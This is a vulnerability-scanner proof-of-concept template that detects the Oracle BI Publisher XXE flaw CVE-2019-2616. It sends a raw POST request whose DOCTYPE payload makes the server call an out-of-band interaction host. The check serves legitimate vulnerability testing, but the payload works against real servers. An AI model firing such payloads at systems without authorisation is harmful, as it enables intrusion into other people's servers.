[info]
author = "AVE"
description = "检测 Oracle BI Publisher（XML Publisher）11.1.1.9.0/12.2.1.3.0/12.2.1.4.0 的 XML 外部实体注入漏洞。通过 POST 请求向 /xmlpserver/ReportTemplateService.xls 发送包含恶意 DOCTYPE 声明的 XML，利用 OOB 方式验证 XXE 是否存在。"
id = "POC-AVE-2019-1111"
name = "CVE-2019-2616 Oracle BI Publisher XXE PoC"
severity = "high"
tags = [
    "cve-2019-2616",
    "xxe",
    "oracle",
    "oob",
]
vuln_id = [
    "CVE-2019-2616",
    "AVE-2019-1111",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/xmlpserver/ReportTemplateService.xls"
protocol = "http"

[poc.requests.body]
content = '<!DOCTYPE soap:envelope PUBLIC "-//B/A/EN" "http://{{interactsh-url}}">'
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "raw"
type = "word"
words = ["http"]
